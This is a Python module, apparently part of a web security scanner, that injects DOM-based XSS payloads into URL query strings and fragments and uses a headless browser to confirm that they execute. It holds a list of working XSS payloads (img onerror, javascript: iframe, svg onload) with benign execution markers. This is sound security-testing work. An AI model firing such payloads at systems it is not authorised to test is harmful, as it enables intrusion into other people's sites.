"""Stage 5: DOM XSS — browser-executed fragment and query injection.

Server-side scanners cannot see DOM XSS: the payload lives in the URL
fragment or in a parameter the server ignores, and only the browser's
script executes it. This module drives a real headless browser at sink
pages (and crawled pages carrying parameters), injects execution-marker
payloads into query strings and fragments, and reports only when the
marker observably executes in the DOM. No execution, no finding.
"""

import secrets

from modules.base import BaseModule


DOM_PAYLOADS = (
    # img-onerror first: verified executing in modern Chromium against a
    # live innerHTML sink. javascript: iframes are blocked by modern
    # browsers and svg-onload is stripped by common sanitizers, so they
    # follow as fallbacks rather than leading.
    '<img src=x onerror=document.body.append(`{m}`.repeat(2))>',
    '<iframe src="javascript:document.body.append(`{m}`.repeat(2))">',
    '<sVg/onLOad=document.body.append(`{m}`.repeat(2))>',
)


class DomXSSScan(BaseModule):
    id = "dom_xss_scan"
    name = "DOM XSS Scan"
    stage = 5
    detectability = "medium"
    depends_on = ["parameter_discovery"]
    active = True

    async def run(self) -> str:
        try:
            from playwright.async_api import async_playwright  # noqa: F401
        except Exception:
            self.state.skip_module(self.id, "playwright not installed")
            return "skipped"

        pages = self._target_pages()
        if not pages:
            self.state.skip_module(self.id, "no pages with injection surface")
            return "skipped"

        cfg = self._cfg()
        max_pages = int(cfg.get("max_pages", 25) or 25)
        reported = 0
        for page_url in pages[:max_pages]:
            if await self._test_page(page_url):
                reported += 1

        self.state.complete_module(self.id)
        self.log(f"DOM XSS: {reported} execution(s) confirmed")
        return "done"

    def _cfg(self) -> dict:
        cfg = self.config.get("modules", {}).get(self.id, {})
        return cfg if isinstance(cfg, dict) else {}

    def _target_pages(self) -> list:
        """Sink pages first (known script territory), then parameterized
        crawled pages, then the base page itself."""
        pages = []
        for asset in self.state.get_assets_by_type("dom_sink"):
            source = str((asset.get("attrs", {}) or {}).get("source", "") or "")
            if source.startswith(("http://", "https://")) and source not in pages:
                pages.append(source)
        for asset in self.state.get_assets_by_type("url"):
            value = str(asset.get("value", "") or "")
            if value.startswith(("http://", "https://")) and value not in pages:
                pages.append(value)
        if self.base_url not in pages:
            pages.append(self.base_url)
        return pages

    async def _test_page(self, page_url: str) -> bool:
        """Inject markers into query and fragment; confirm DOM execution."""
        from urllib.parse import parse_qsl, urlparse
        from core.validators import inject_param

        try:
            parsed = urlparse(page_url)
        except ValueError:
            return False
        # SPA fragment routes carry the page identity after #: /#/search
        # is a different sink surface than /, and dropping the fragment
        # tests the wrong page entirely.
        route = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
        if parsed.fragment:
            route += "#" + parsed.fragment.split("?")[0]
        base = route
        candidates = [f"{base}?q={{P}}", f"{base}#q={{P}}",
                      f"{base}?search={{P}}", f"{base}#__q={{P}}"]
        # A page whose own query string (or fragment query) names
        # parameters gets those too.
        from urllib.parse import parse_qsl
        existing = []
        try:
            existing.extend(name for name, _ in parse_qsl(
                parsed.query or "", keep_blank_values=True))
            if parsed.fragment and "?" in parsed.fragment:
                existing.extend(name for name, _ in parse_qsl(
                    parsed.fragment.split("?", 1)[1], keep_blank_values=True))
        except ValueError:
            pass
        for name in existing[:5]:
            candidates.append(inject_param(base, name, "{P}"))

        for template in candidates:
            marker = f"domxss{secrets.token_hex(4)}"
            expected = marker * 2
            payload = DOM_PAYLOADS[0].format(m=marker)
            url = template.replace("{P}", payload, 1)
            from urllib.parse import quote
            url = url.replace(payload, quote(payload, safe=""), 1)
            if await _browser_executes(url, expected, self.config):
                self.state.add_finding(
                    title=f"DOM XSS Executed: {base}",
                    severity="HIGH",
                    confidence="CONFIRMED",
                    category="XSS",
                    description=(
                        f"Payload injected into {template.split('{P}')[0]}… "
                        f"executed in a real browser: the DOM contained the "
                        f"execution marker. Client-side code renders URL input "
                        f"as markup."),
                    evidence=[f"Page: {base}", f"Payload: {payload}",
                              f"Marker executed: {expected}"],
                    remediation="Never sink URL input into innerHTML; use "
                                "textContent, sanitize with DOMPurify, and "
                                "enforce a strict CSP.",
                    asset_keys=[f"url:{base}"],
                    verified=True,
                    verification={"method": "browser_dom_execution",
                                  "url": url},
                )
                return True
        return False


async def _browser_executes(url: str, expected: str, config: dict) -> bool:
    """Load the URL headless; True when the marker executes in the DOM."""
    from playwright.async_api import async_playwright

    auth = config.get("auth", {}) or {}
    headers = {
        str(k): str(v)
        for k, v in (auth.get("headers") or {}).items()
        if k and v is not None and str(v) != "" and str(k).lower() != "cookie"
    }
    bearer = auth.get("bearer_token") or auth.get("token")
    if bearer and "Authorization" not in headers:
        headers["Authorization"] = f"Bearer {bearer}"

    async with async_playwright() as playwright:
        browser = await playwright.chromium.launch(headless=True)
        context = await browser.new_context(extra_http_headers=headers)
        page = await context.new_page()
        try:
            await page.goto(url, wait_until="networkidle", timeout=20000)
            await page.wait_for_timeout(800)
            text = await page.evaluate(
                "() => document.body ? document.body.textContent : ''")
            inner = await page.evaluate(
                "() => document.documentElement ? "
                "document.documentElement.innerHTML : ''")
        except Exception:
            await browser.close()
            return False
        await browser.close()
    return expected in (text or "") or expected in (inner or "")
